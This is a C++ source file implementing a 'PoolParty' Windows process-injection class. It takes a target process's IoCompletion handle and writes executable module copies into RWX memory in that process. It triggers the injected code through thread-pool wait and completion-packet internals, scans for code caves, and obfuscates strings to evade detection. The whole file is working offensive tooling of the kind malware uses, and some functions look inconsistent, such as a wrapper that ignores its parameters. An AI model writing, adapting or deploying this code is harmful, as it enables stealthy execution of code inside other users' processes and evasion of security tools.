#include "poolparty.h"
#include "ntstructs.h"
#include "skCrypter.h"
#include <iostream>

PoolParty::PoolParty(HANDLE process_handle) : process_handle(process_handle) {
	PROCESS_HANDLE_SNAPSHOT_INFORMATION* handles = (PROCESS_HANDLE_SNAPSHOT_INFORMATION*)(new char[1024]);
	OBJECT_TYPE_INFORMATION* handle_type_i = (OBJECT_TYPE_INFORMATION*)(new char[1024]);
	NtQueryInformationProcess(process_handle, 51, handles, 1024, NULL);

	HANDLE handle;
	for (ULONG_PTR handle_idx = 0; handle_idx <= handles->NumberOfHandles; handle_idx++) {
		DuplicateHandle(process_handle, handles->Handles[handle_idx].HandleValue, GetCurrentProcess(), &handle, GENERIC_ALL, 0, 0);
		NtQueryObject(handle, 2, handle_type_i, 1024, NULL);

		if (!wcscmp(skCrypt(L"IoCompletion"), handle_type_i->TypeName.Buffer)) {
			io_handle = handle;
			break;
		} else
			CloseHandle(handle);
	};
}

HANDLE PoolParty::get_io_handle() {
	return io_handle;
}

MODULEENTRY32 PoolParty::get_function_module(void(*function)()) {
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, 0);

	MODULEENTRY32 entry;
	entry.dwSize = sizeof(entry);

	if (Module32First(snapshot, &entry)) {
		do {
			uintptr_t distance = (uintptr_t)function - (uintptr_t)entry.modBaseAddr;
			bool is_relative = distance < (uintptr_t)entry.modBaseSize;

			if (is_relative) {
				CloseHandle(snapshot);
				return entry;
			};
		} while (Module32Next(snapshot, &entry));
	};

	CloseHandle(snapshot);
	return entry;
}

PVOID PoolParty::allocate(void(*function)()) {
	MODULEENTRY32 function_module = get_function_module(function);
	PVOID module_base = function_module.modBaseAddr;
	DWORD module_size = function_module.modBaseSize;

	unsigned char* module_buffer = new unsigned char[module_size];
	memcpy(module_buffer, module_base, module_size);

	PVOID module_alloc = allocated_modules[module_base];
	if (!module_alloc) {
		module_alloc = VirtualAllocEx(process_handle, NULL, module_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		allocated_modules[module_base] = module_alloc;
	}

	VirtualProtectEx(process_handle, module_alloc, module_size, PAGE_EXECUTE_READWRITE, NULL);
	WriteProcessMemory(process_handle, module_alloc, module_buffer, module_size, NULL);

	return (PVOID)((((BYTE*)function - (BYTE*)module_base)) + (BYTE*)module_alloc);
}

unsigned char* PoolParty::get_bytes(PVOID address, size_t size) {
	unsigned char* bytes = new unsigned char[size];
	ReadProcessMemory(process_handle, address, bytes, size, NULL);
	return bytes;
};

bool PoolParty::set_bytes(PVOID address, unsigned char* bytes, size_t size) {
	return WriteProcessMemory(process_handle, address, bytes, size, NULL);
};

bool PoolParty::execute(PVOID address) {
	PFULL_TP_WAIT wait = (PFULL_TP_WAIT)CreateThreadpoolWait((PTP_WAIT_CALLBACK)address, NULL, NULL);
	PFULL_TP_WAIT full_wait = (PFULL_TP_WAIT)VirtualAllocEx(process_handle, NULL, sizeof(FULL_TP_WAIT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	WriteProcessMemory(process_handle, full_wait, wait, sizeof(FULL_TP_WAIT), NULL);

	PTP_DIRECT direct = (PTP_DIRECT)VirtualAllocEx(process_handle, NULL, sizeof(TP_DIRECT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	WriteProcessMemory(process_handle, direct, &wait->Direct, sizeof(TP_DIRECT), NULL);

	HANDLE event = CreateEventA(NULL, 0, 0, skCrypt("PoolPartyEvent"));
	ZwAssociateWaitCompletionPacket(wait->WaitPkt, io_handle, event, direct, full_wait, 0, 0, NULL);
	SetEvent(event);
	
	return (full_wait && direct);
};

PVOID PoolParty::scan_codecave(HANDLE process) {
	size_t cave_size = 1000;
	MEMORY_BASIC_INFORMATION mbi;
	for (uintptr_t i = 0; i < 0x7FFFFFFF0000;) {
		PVOID address = reinterpret_cast<PVOID>(i);
		VirtualQueryEx(process, address, &mbi, sizeof(mbi));

		size_t region_size = mbi.RegionSize;
		bool is_safe = mbi.RegionSize != 0x200000;
		bool is_executable = mbi.Protect & (
			PAGE_EXECUTE | PAGE_EXECUTE_READ |
			PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY
			);

		if (is_safe && is_executable) {
			unsigned char* buffer = new unsigned char[region_size];
			size_t bytes_read;
			bool is_read = ReadProcessMemory(process, address, buffer, region_size, &bytes_read);

			if (is_read) {
				for (size_t j = 0; j < bytes_read - cave_size; ++j) {
					bool match = true;
					for (size_t o = 0; o < cave_size; ++o) {
						if (buffer[j + o] != 0xCC) {
							match = false;
							break;
						}
					}
					if (match) {
						delete[] buffer;
						return (PVOID)((uintptr_t)address + j);
					}
				}
			}
			delete[] buffer;
		}
		i += region_size;
	}
	return NULL;
}

bool PoolParty::m_ZwSetIoCompletion(HANDLE io_handle, PTP_DIRECT remote_direct, PVOID key, PVOID apc_context, PVOID apc_routine) {
	return ZwAssociateWaitCompletionPacket(io_handle, io_handle, NULL, remote_direct, NULL, 0, 0, NULL) == 0;
}

void PoolParty::SetupExecution(PoolParty& pool_party, TP_DIRECT* m_ShellcodeAddress) {
	PTP_WAIT wait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)m_ShellcodeAddress, NULL, NULL);
	PTP_WAIT remote_wait = static_cast<PTP_WAIT>(pool_party.allocate(reinterpret_cast<void(*)()>(m_ShellcodeAddress)));
	pool_party.set_bytes(remote_wait, reinterpret_cast<unsigned char*>(&wait), sizeof(PTP_WAIT));
	pool_party.m_ZwSetIoCompletion(pool_party.get_io_handle(), reinterpret_cast<PTP_DIRECT>(remote_wait), 0, 0, 0);
}

